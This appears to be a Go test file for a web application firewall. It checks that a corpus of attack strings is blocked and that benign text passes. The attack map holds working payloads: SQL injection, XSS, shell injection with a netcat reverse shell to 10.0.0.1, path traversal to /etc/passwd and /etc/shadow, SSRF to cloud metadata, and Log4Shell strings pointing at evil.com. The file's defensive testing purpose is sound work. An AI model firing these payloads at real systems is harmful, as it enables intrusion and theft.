package engine

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func testEngine(t *testing.T) *Engine {
	t.Helper()
	rs, err := Loader{}.Load()
	if err != nil {
		t.Fatal(err)
	}
	cfg := DefaultConfig()
	return New(cfg, rs)
}

// inQuery runs a payload as a single query param value.
func inQuery(e *Engine, payload string) *Verdict {
	r := httptest.NewRequest("GET", "/search?q="+urlEnc(payload), nil)
	return e.Inspect(r)
}

func inBody(e *Engine, payload string) *Verdict {
	r := httptest.NewRequest("POST", "/submit", strings.NewReader("data="+urlEnc(payload)))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	return e.Inspect(r)
}

func urlEnc(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		c := s[i]
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~' {
			b.WriteByte(c)
		} else {
			const h = "0123456789ABCDEF"
			b.WriteByte('%')
			b.WriteByte(h[c>>4])
			b.WriteByte(h[c&0xf])
		}
	}
	return b.String()
}

var attacks = map[string][]string{
	"sqli": {
		"' or '1'='1", "' or 1=1--", "1' union select null,null--", "admin'--",
		"'; drop table users--", "1 and sleep(5)", "' and extractvalue(1,concat(0x7e,version()))--",
		"1' order by 100--", "') or ('a'='a",
	},
	"xss": {
		"<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
		"<iframe src=javascript:alert(1)>", "\"><script>alert(document.cookie)</script>",
		"<a href=\"javascript:alert(1)\">x</a>",
	},
	"rce": {
		"; cat /etc/passwd", "| id", "$(whoami)", "`uname -a`", "&& nc -e /bin/sh 10.0.0.1 4444",
	},
	"lfi": {
		"../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "/proc/self/environ",
		"....//....//etc/passwd", "/var/www/../../etc/shadow",
	},
	"ssrf": {
		"http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:6379/",
		"http://2130706433/", "gopher://127.0.0.1:25/", "file:///etc/passwd",
	},
	"nosql": {
		"user[$ne]=1", "user[$gt]=", `{"$where":"sleep(1000)"}`, `{"$gt":""}`,
	},
	"log4j": {
		"${jndi:ldap://evil.com/x}", "${${lower:j}ndi:ldap://x}", "${::-j}${::-n}${::-d}${::-i}:ldap://x",
	},
	"scanner": {"sqlmap/1.7", "Nikto/2.1.6", "Mozilla/5.0 nuclei"},
}

func TestAttackCorpus(t *testing.T) {
	e := testEngine(t)
	for cat, list := range attacks {
		for _, payload := range list {
			var v *Verdict
			switch cat {
			case "nosql":
				r := httptest.NewRequest("POST", "/api", strings.NewReader(payload))
				r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				if strings.HasPrefix(payload, "{") {
					r = httptest.NewRequest("POST", "/api", strings.NewReader(payload))
					r.Header.Set("Content-Type", "application/json")
				}
				v = e.Inspect(r)
			case "log4j":
				v = inBody(e, payload)
			case "scanner":
				r := httptest.NewRequest("GET", "/", nil)
				r.Header.Set("User-Agent", payload)
				v = e.Inspect(r)
			default:
				v = inBody(e, payload)
			}
			if !v.Blocked() {
				t.Errorf("MISS [%s]: %q (score %d, %s)", cat, payload, v.Score, v.Summary())
			}
		}
	}
}

var benign = []string{
	"grant writing tips for students",
	"how to drop a table in excel",
	"the union strike is over",
	"do you like cats or dogs",
	"price is 10 or 20 dollars",
	"select the best option and continue",
	"O'Brien's restaurant",
	"it's a beautiful day, isn't it",
	"search for red shoes size 10",
	"my email is john.doe@example.com",
	"visit https://example.com/page?ref=home&utm=x",
	"2024-01-01 to 2024-12-31",
	"<p>Hello <b>world</b></p>",
	"use url(/images/bg.png) in css",
	"the xmlns namespace declaration",
	"function onLoad() { init(); }",
	"C++ && Java are languages",
	"between you and me",
	"a normal sentence with no attacks whatsoever",
	"drop off the kids at 3pm",
	"i want to order by tuesday please",
	"having a great time here",
	"update: the meeting is at noon",
	"delete this later reminder",
	"insert your name in the form",
	"password reset requested",
	"true or false quiz",
	"the quick brown fox jumps",
	"café résumé naïve",
	"日本語のテスト",
	"user profile settings page",
	"/api/v1/users/12345/profile",
	"${user_name} welcome back",
	"redirect=/dashboard?tab=settings",
}

func TestBenignCorpus(t *testing.T) {
	e := testEngine(t)
	for _, payload := range benign {
		if v := inQuery(e, payload); v.Blocked() {
			t.Errorf("FALSE POSITIVE (query): %q -> %s [%s]", payload, v.Summary(), v.RuleIDs())
		}
		if v := inBody(e, payload); v.Blocked() {
			t.Errorf("FALSE POSITIVE (body): %q -> %s [%s]", payload, v.Summary(), v.RuleIDs())
		}
	}
}

func TestCleanRequestPasses(t *testing.T) {
	e := testEngine(t)
	r := httptest.NewRequest("GET", "/products?category=shoes&color=red&page=2", nil)
	r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	r.Header.Set("Accept", "text/html")
	if v := e.Inspect(r); v.Blocked() {
		t.Fatalf("clean request blocked: %s [%s]", v.Summary(), v.RuleIDs())
	}
	_ = http.StatusOK
}
